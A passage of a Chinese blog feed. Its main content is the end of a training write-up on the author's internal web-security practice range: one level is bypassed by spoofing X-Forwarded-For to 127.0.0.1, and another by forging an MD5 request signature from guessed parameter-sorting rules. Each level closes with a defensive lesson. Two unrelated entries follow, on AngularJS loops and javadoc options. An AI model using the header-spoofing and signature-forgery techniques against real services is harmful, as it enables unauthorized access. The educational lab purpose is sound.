src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_30.png" alt="关卡7-提示"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160309_30.png" alt="关卡7-提示"></p><p>提示内容：你不是来自于127.0.0.1的访客。反过来，提示的意思可以理解为只有IP地址来自于127.0.0.1的用户才有访问的权限。</p><p>于是则需要伪造请求ip地址为127.0.0.1。<br>一般地，涉及到ip地址的请求头有：X-Real-IP、X-Forwarded-For、Host。<br>伪造ip时，一一尝试，最终发现设置 X-Forwarded-For 为127.0.0.1 成功通关。</p><h3 id="4-补充内容"><a href="#4-补充内容" class="headerlink" title="4. 补充内容"></a>4. 补充内容</h3><h4 id="请求头信息修改工具"><a href="#请求头信息修改工具" class="headerlink" title="请求头信息修改工具"></a>请求头信息修改工具</h4><p>使用chrome插件工具ModHeader来修改请求头信息：<a href="https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj">https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj</a></p><h4 id="客户端IP流转"><a href="#客户端IP流转" class="headerlink" title="客户端IP流转"></a>客户端IP流转</h4><p>服务器经过Apache,Squid等反向代理软件层层代理转发后，其原始IP地址可能会丢失。</p><p>服务器通过<code>request.getRemoteAddr();</code>只能获取直接请求的ip地址。<br>对于服务器之上架设有代理服务器的，则是代理服务器的ip地址；对于用户直接访问服务器，中间并没有代理服务器的情况，获取的ip地址才是用户真正的ip地址。</p><p>对于服务器代理产生的ip丢失情况，一些反射代理服务器开始引入X-Forwarded-For和X-Real-IP等非正式的http协议头，用于保存原始客户端的ip地址。</p><p>一般地，服务器程序会优先从X-Forwarded-For和X-Real-IP二个协议头里取ip地址，没有再从request里取ip地址。<br><strong>注</strong>：CRM后端代码还是额外check Proxy-Client-IP和WL-Proxy-Client-IP协议头。</p><p>参考：<a href="http://www.cnblogs.com/ITtangtang/p/3927768.html">Java获取客户端IP</a></p><h3 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h3><p>大家通用的客户端ip地址获取方法，经过代理服务器转发后，并不一定可靠。<br>因此，使用ip来做权限上的限制也并不是100%安全的。</p><h2 id="0x08-关卡8"><a href="#0x08-关卡8" class="headerlink" title="0x08 关卡8"></a>0x08 关卡8</h2><h3 id="1-准备"><a href="#1-准备" class="headerlink" title="1. 准备"></a>1. 准备</h3><h4 id="二维码生成"><a href="#二维码生成" class="headerlink" title="二维码生成"></a>二维码生成</h4><p>生成二维码工具：</p><ul><li><a href="http://cli.im/">http://cli.im/</a></li><li><a href="http://liantu.com/">http://liantu.com/</a></li></ul><p>生成内容：<br><a href="http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933">http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933</a></p><h4 id="二维码解码"><a href="#二维码解码" class="headerlink" title="二维码解码"></a>二维码解码</h4><p>推荐使用：<a href="http://tool.oschina.net/qr?type=2">http://tool.oschina.net/qr?type=2</a><br>试过其他的几个不能解码中间有logo图片的二维码。</p><h3 id="2-提示"><a href="#2-提示" class="headerlink" title="2. 提示"></a>2. 提示</h3><p>提示如下：</p><blockquote><p>任务目标：请主动设置你的过关级别为8<br>Tips：你猜到他们猜不到你猜得到他们猜不到你猜得到</p></blockquote><h3 id="2-界面-7"><a href="#2-界面-7" class="headerlink" title="2. 界面"></a>2. 界面</h3><p>界面如下图所示：<br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_35.png" alt="关卡8"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_35.png" alt="关卡8"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_35.png" alt="关卡8"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_35.png" alt="关卡8"></p><h3 id="3-揭密-7"><a href="#3-揭密-7" class="headerlink" title="3. 揭密"></a>3. 揭密</h3><p>第8关上来就是一个大大的二维码。<br>通过二维码反解工具，得到一个网址：<a href="http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933%E3%80%82">http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933。</a></p><p>由于我们第7关已经过关，因此这个url还需要变通一下。修改后完成的url为：<a href="http://10.4.236.115:8080/sohu/stage8?level=8&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933%E3%80%82">http://10.4.236.115:8080/sohu/stage8?level=8&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933。</a></p><p>直接提示：”这是一次已经过期的提交，请在2分钟内完成请求提交。”<br>由此可见，参数time不在2分钟内。反查查秒级时间得到内容为：2016-03-09 00:00:00，确认不是当时时间2分钟内。</p><p>修改time内容为当前时间后再提交，提示：”请求在服务器端验证失败。”。<br>可以猜测，参数verify不对。这个verfiy一看就是经过md5加密的。</p><p>根据开发时与第三方接口对接的经验，verfiy是通过前面几个参数按照某种规则生成的。<br>如是，依次尝试主流的微信、腾讯、淘宝开放平台，最终发现与腾讯开放平台的签名规则相似。</p><p>第1步：将level、username、time三个参数进行字典序排序。<br>第2步：将第1步中排序后的参数(key=value)用&amp;拼接起来：level=8&amp;time=1457452800&amp;username=yeshaoting。<br>第3步：对第2步内容进行md5加密，得到verfity值。</p><h3 id="4-补充知识：签名规则"><a href="#4-补充知识：签名规则" class="headerlink" title="4. 补充知识：签名规则"></a>4. 补充知识：签名规则</h3><h4 id="微信开放平台"><a href="#微信开放平台" class="headerlink" title="微信开放平台"></a>微信开放平台</h4><p>参见：<a href="http://mp.weixin.qq.com/wiki?t=resource/res_main&id=mp1421135319&token=&lang=zh_CN">微信签名规则</a><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_31.png" alt="关卡8-微信签名规则"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_31.png" alt="关卡8-微信签名规则"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_31.png" alt="关卡8-微信签名规则"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_31.png" alt="关卡8-微信签名规则"></p><h4 id="腾讯开放平台"><a href="#腾讯开放平台" class="headerlink" title="腾讯开放平台"></a>腾讯开放平台</h4><p>参见：<a href="http://wiki.open.qq.com/wiki/%E8%85%BE%E8%AE%AF%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E7%AD%BE%E5%90%8D%E5%8F%82%E6%95%B0sig%E7%9A%84%E8%AF%B4%E6%98%8E">腾讯签名规则</a><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_33.png" alt="关卡8-腾讯签名规则"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_33.png" alt="关卡8-腾讯签名规则"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_33.png" alt="关卡8-腾讯签名规则"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_33.png" alt="关卡8-腾讯签名规则"></p><h4 id="淘宝开放平台"><a href="#淘宝开放平台" class="headerlink" title="淘宝开放平台"></a>淘宝开放平台</h4><p>参见：<a href="http://open.taobao.com/doc2/detail.htm?articleId=101617&docType=1&treeId=1#s5">淘宝签名规则</a><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_34.png" alt="关卡8-淘宝签名规则"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_34.png" alt="关卡8-淘宝签名规则"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_34.png" alt="关卡8-淘宝签名规则"><br><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160310_34.png" alt="关卡8-淘宝签名规则"></p><h3 id="5-小结-1"><a href="#5-小结-1" class="headerlink" title="5. 小结"></a>5. 小结</h3><p>签名方式尽量与市面上的一些规则区分开。<br>签名规则也是有可能会被猜出，可以通过一些别的类似于关卡5小结里的限制来辅助提高安全性。</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/hack.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;WEB安全渗透靶场：&lt;a href=&quot;http://10.4.236.115:8080/&quot;&gt;http://10.4.236.115:8080/&lt;/a&gt;&lt;br&gt;是否开放所有关卡切换：&lt;a href=&quot;http://10.4.236.115:8080/sohu/switchOpenStage&quot;&gt;http://10.4.236.115:8080/sohu/switchOpenStage&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此次分享内容旨在加深开发工作中的安全意识，也希望能起到抛砖引玉的作用，在分享完成后的讨论环节大家也说说自己现在或者曾经遇到过的安全问题。&lt;/p&gt;
&lt;p&gt;为了让大家能参与其中，对WEB安全问题有个更具象的认识。周末二天基于 &lt;code&gt;angularjs&lt;/code&gt;、&lt;code&gt;jquery&lt;/code&gt;、&lt;code&gt;spring&lt;/code&gt;、&lt;code&gt;spring mvc&lt;/code&gt;、&lt;code&gt;mybatis&lt;/code&gt;、&lt;code&gt;mysql&lt;/code&gt; 搭建一个比较粗糙的WEB安全靶场，复刻自参加的第一屇搜狐安全擂台赛，供大家hack。&lt;br&gt;如发现问题，请各位见谅哈。&lt;/p&gt;
&lt;h3 id=&quot;1-用户登记&quot;&gt;&lt;a href=&quot;#1-用户登记&quot; class=&quot;headerlink&quot; title=&quot;1. 用户登记&quot;&gt;&lt;/a&gt;1. 用户登记&lt;/h3&gt;&lt;p&gt;主要是为了收集用户名信息，进行登记，用于记录闯关进度!&lt;/p&gt;
&lt;p&gt;界面如下图所示：&lt;br&gt;&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_1.png&quot; alt=&quot;用户登记&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_1.png&quot; alt=&quot;用户登记&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_1.png&quot; alt=&quot;用户登记&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_1.png&quot; alt=&quot;用户登记&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-用户主页&quot;&gt;&lt;a href=&quot;#2-用户主页&quot; class=&quot;headerlink&quot; title=&quot;2. 用户主页&quot;&gt;&lt;/a&gt;2. 用户主页&lt;/h3&gt;&lt;p&gt;简单地展示用户当前进度，并提供进入下一关的入口。后续可以扩展，显示击败百分之多少的对手。&lt;/p&gt;
&lt;p&gt;界面如下图所示：&lt;br&gt;&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_3.png&quot; alt=&quot;用户主页&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_3.png&quot; alt=&quot;用户主页&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_3.png&quot; alt=&quot;用户主页&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/WEB%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%88%86%E4%BA%AB/Snip20160308_3.png&quot; alt=&quot;用户主页&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="信息安全" scheme="http://yeshaoting.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透" scheme="http://yeshaoting.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>angularjs循环指定次数</title>
    <link href="http://yeshaoting.cn/article/js/angularjs%E5%BE%AA%E7%8E%AF%E6%8C%87%E5%AE%9A%E6%AC%A1%E6%95%B0/"/>
    <id>http://yeshaoting.cn/article/js/angularjs%E5%BE%AA%E7%8E%AF%E6%8C%87%E5%AE%9A%E6%AC%A1%E6%95%B0/</id>
    <published>2016-03-13T02:16:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/angularjs.png" class="img-logo img-center" /><h2 id="一、js代码"><a href="#一、js代码" class="headerlink" title="一、js代码"></a>一、js代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$scope.range = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过new Array(n)创建指定大小容量的数组。</p><h2 id="二、html代码"><a href="#二、html代码" class="headerlink" title="二、html代码"></a>二、html代码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;list-group-horizontal&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">ng-repeat</span>=<span class="string">&quot;i in range(6) track by $index&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">ng-bind</span>=<span class="string">&quot;$index + 1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>遍历数组，并通过track by $index来指定数组索引为$index。</p><h2 id="三、输出结果"><a href="#三、输出结果" class="headerlink" title="三、输出结果"></a>三、输出结果</h2><p>输出结果为：1 2 3 4 5 6</p><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><p><a href="http://stackoverflow.com/questions/16824853/way-to-ng-repeat-defined-number-of-times-instead-of-repeating-over-array">Way to ng-repeat defined number of times instead of repeating over array?</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/angularjs.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、js代码&quot;&gt;&lt;a href=&quot;#一、js代码&quot; class=&quot;headerlink&quot; title=&quot;一</summary>
      
    
    
    
    <category term="前端设计" scheme="http://yeshaoting.cn/categories/%E5%89%8D%E7%AB%AF%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="angularjs" scheme="http://yeshaoting.cn/tags/angularjs/"/>
    
  </entry>
  
  <entry>
    <title>生成javadoc文档</title>
    <link href="http://yeshaoting.cn/article/java/%E7%94%9F%E6%88%90javadoc%E6%96%87%E6%A1%A3/"/>
    <id>http://yeshaoting.cn/article/java/%E7%94%9F%E6%88%90javadoc%E6%96%87%E6%A1%A3/</id>
    <published>2016-03-11T10:33:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/java.png" class="img-logo img-center" /><h2 id="一、查看javadoc帮助文档"><a href="#一、查看javadoc帮助文档" class="headerlink" title="一、查看javadoc帮助文档"></a>一、查看javadoc帮助文档</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:~ yeshaoting$ javadoc --<span class="built_in">help</span></span><br><span class="line">javadoc: 错误 - 无效的标记: --<span class="built_in">help</span></span><br><span class="line">用法: javadoc [options] [packagenames] [sourcefiles] [@files]</span><br><span class="line">  -overview &lt;file&gt;                 从 HTML 文件读取概览文档</span><br><span class="line">  -public                          仅显示 public 类和成员</span><br><span class="line">  -protected                       显示 protected/public 类和成员 (默认值)</span><br><span class="line">  -package                         显示 package/protected/public 类和成员</span><br><span class="line">  -private                         显示所有类和成员</span><br><span class="line">  -<span class="built_in">help</span>                            显示命令行选项并退出</span><br><span class="line">  -doclet &lt;class&gt;                  通过替代 doclet 生成输出</span><br><span class="line">  -docletpath &lt;path&gt;               指定查找 doclet 类文件的位置</span><br><span class="line">  -sourcepath &lt;pathlist&gt;           指定查找源文件的位置</span><br><span class="line">  -classpath &lt;pathlist&gt;            指定查找用户类文件的位置</span><br><span class="line">  -cp &lt;pathlist&gt;                   指定查找用户类文件的位置</span><br><span class="line">  -exclude &lt;pkglist&gt;               指定要排除的程序包列表</span><br><span class="line">  -subpackages &lt;subpkglist&gt;        指定要递归加载的子程序包</span><br><span class="line">  -breakiterator                   计算带有 BreakIterator 的第一个语句</span><br><span class="line">  -bootclasspath &lt;pathlist&gt;        覆盖由引导类加载器所加载的</span><br><span class="line">                                   类文件的位置</span><br><span class="line">  -<span class="built_in">source</span> &lt;release&gt;                提供与指定发行版的源兼容性</span><br><span class="line">  -extdirs &lt;dirlist&gt;               覆盖所安装扩展的位置</span><br><span class="line">  -verbose                         输出有关 Javadoc 正在执行的操作的信息</span><br><span class="line">  -locale &lt;name&gt;                   要使用的区域设置, 例如 en_US 或 en_US_WIN</span><br><span class="line">  -encoding &lt;name&gt;                 源文件编码名称</span><br><span class="line">  -quiet                           不显示状态消息</span><br><span class="line">  -J&lt;flag&gt;                         直接将 &lt;flag&gt; 传递到运行时系统</span><br><span class="line">  -X                               输出非标准选项的提要</span><br><span class="line"></span><br><span class="line">通过标准 doclet 提供:</span><br><span class="line">  -d &lt;directory&gt;                   输出文件的目标目录</span><br><span class="line">  -use                             创建类和程序包用法页面</span><br><span class="line">  -version                         包含 @version 段</span><br><span class="line">  -author                          包含 @author 段</span><br><span class="line">  -docfilessubdirs                 递归复制文档文件子目录</span><br><span class="line">  -splitindex                      将索引分为每个字母对应一个文件</span><br><span class="line">  -windowtitle &lt;text&gt;              文档的浏览器窗口标题</span><br><span class="line">  -doctitle &lt;html-code&gt;            包含概览页面的标题</span><br><span class="line">  -header &lt;html-code&gt;              包含每个页面的页眉文本</span><br><span class="line">  -footer &lt;html-code&gt;              包含每个页面的页脚文本</span><br><span class="line">  -top    &lt;html-code&gt;              包含每个页面的顶部文本</span><br><span class="line">  -bottom &lt;html-code&gt;              包含每个页面的底部文本</span><br><span class="line">  -link &lt;url&gt;                      创建指向位于 &lt;url&gt; 的 javadoc 输出的链接</span><br><span class="line">  -linkoffline &lt;url&gt; &lt;url2&gt;        利用位于 &lt;url2&gt; 的程序包列表链接至位于 &lt;url&gt; 的文档</span><br><span class="line">  -excludedocfilessubdir &lt;name1&gt;:.. 排除具有给定名称的所有文档文件子目录。</span><br><span class="line">  -group &lt;name&gt; &lt;p1&gt;:&lt;p2&gt;..        在概览页面中, 将指定的程序包分组</span><br><span class="line">  -nocomment                       不生成说明和标记, 只生成声明。</span><br><span class="line">  -nodeprecated                    不包含 @deprecated 信息</span><br><span class="line">  -noqualifier &lt;name1&gt;:&lt;name2&gt;:... 输出中不包括指定限定符的列表。</span><br><span class="line">  -nosince                         不包含 @since 信息</span><br><span class="line">  -notimestamp                     不包含隐藏时间戳</span><br><span class="line">  -nodeprecatedlist                不生成已过时的列表</span><br><span class="line">  -notree                          不生成类分层结构</span><br><span class="line">  -noindex                         不生成索引</span><br><span class="line">  -nohelp                          不生成帮助链接</span><br><span class="line">  -nonavbar                        不生成导航栏</span><br><span class="line">  -serialwarn                      生成有关 @serial 标记的警告</span><br><span class="line">  -tag &lt;name&gt;:&lt;locations&gt;:&lt;header&gt; 指定单个参数定制标记</span><br><span class="line">  -taglet                          要注册的 Taglet 的全限定名称</span><br><span class="line">  -tagletpath                      Taglet 的路径</span><br><span class="line">  -charset &lt;charset&gt;               用于跨平台查看生成的文档的字符集。</span><br><span class="line">  -helpfile &lt;file&gt;                 包含帮助链接所链接到的文件</span><br><span class="line">  -linksource                      以 HTML 格式生成源文件</span><br><span class="line">  -sourcetab &lt;tab length&gt;          指定源中每个制表符占据的空格数</span><br><span class="line">  -keywords                        使程序包, 类和成员信息附带 HTML 元标记</span><br><span class="line">  -stylesheetfile &lt;path&gt;           用于更改生成文档的样式的文件</span><br><span class="line">  -docencoding &lt;name&gt;              指定输出的字符编码</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="二、命令举例"><a href="#二、命令举例" class="headerlink" title="二、命令举例"></a>二、命令举例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出所有cn.yeshaoting.jvwa包及子包</span></span><br><span class="line">javadoc cn.yeshaoting.jvwa * -subpackages * -d ~/doc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出所有cn.yeshaoting.jvwa下指定子包</span></span><br><span class="line">javadoc cn.yeshaoting.jvwa * -subpackages cn.yeshaoting.jvwa.web cn.yeshaoting.jvwa.util -d ~/doc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出所有cn.yeshaoting.jvwa下 package/protected/public 类和成员(默认值 -protected：只显示 protected/public 类和成员)</span></span><br><span class="line">javadoc cn.yeshaoting.jvwa * -package -d ~/doc</span><br></pre></td></tr></table></figure><h2 id="三、自定义标签"><a href="#三、自定义标签" class="headerlink" title="三、自定义标签"></a>三、自定义标签</h2><p>自定义标签输出到javadoc文档中，可以通过参数-tag来完成。<br>javadoc帮助文档说明如下：</p><blockquote><p><code>-tag &lt;name&gt;:&lt;locations&gt;:&lt;header&gt; 指定单个参数定制标记</code></p></blockquote><p>其中，name表示标签名称，locations表示处理标签所在的位置，header表示标签显示名。<br>另外，locations官方解释如下：</p><blockquote><p>Placement of tags - The Xaoptcmf part of the argument determines where in the source code the tag is allowed to be placed, and whether the tag can be disabled (using X). You can supply either a, to allow the tag in all places, or any combination of the other letters:<br>X (disable tag)<br>a (all)<br>o (overview)<br>p (packages)<br>t (types, that is classes and interfaces)<br>c (constructors)<br>m (methods)<br>f (fields)</p></blockquote><p>一般地，直接使用a即可。</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javadoc cn.yeshaoting.jvwa * -tag <span class="string">&quot;api.name&quot;</span>:a:<span class="string">&quot;接口名：&quot;</span> -tag <span class="string">&quot;api.apiId&quot;</span>:a:<span class="string">&quot;api id：&quot;</span> -tag <span class="string">&quot;api.description&quot;</span>:a:<span class="string">&quot;接口描述：&quot;</span> -tag <span class="string">&quot;api.category&quot;</span>:a:<span class="string">&quot;所属应用：&quot;</span> -tag <span class="string">&quot;api.param&quot;</span>:a:<span class="string">&quot;参数：&quot;</span> -tag <span class="string">&quot;api.result&quot;</span>:a<span class="string">&quot;返回结果：&quot;</span> -tag <span class="string">&quot;api.requestExample&quot;</span>:a:<span class="string">&quot;请求实例：&quot;</span> -tag <span class="string">&quot;api.responseExample&quot;</span>:a:<span class="string">&quot;响应实例：&quot;</span> -tag <span class="string">&quot;api.errorExample&quot;</span>:a:<span class="string">&quot;错误实例：&quot;</span> -d ~/doc</span><br></pre></td></tr></table></figure><p><strong>注</strong>：程序中标签声明形如：@api.name，@api.description，@datetime。</p><h2 id="四、生成chm文档"><a href="#四、生成chm文档" class="headerlink" title="四、生成chm文档"></a>四、生成chm文档</h2><p>可参考：<a href="http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551">Javadoc转换chm帮助文档的四种方法总结</a></p><h2 id="五、参考文档"><a href="#五、参考文档" class="headerlink" title="五、参考文档"></a>五、参考文档</h2><ul><li><a href="http://www.blogjava.net/lishunli/archive/2010/01/12/309218.html">如何个性化地生成Javadoc文档</a></li><li><a href="http://blog.sina.com.cn/s/blog_6e371452010177dj.html">如何自动生成javadoc及添加自定义标签 </a></li><li><a href="http://blog.csdn.net/jianxin1009/article/details/35269501">多模块Maven项目如何使用javadoc插件生成文档</a></li><li><a href="http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551">Javadoc转换chm帮助文档的四种方法总结</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/java.png&quot; class=&quot;img-logo img-center&quot; /&gt;


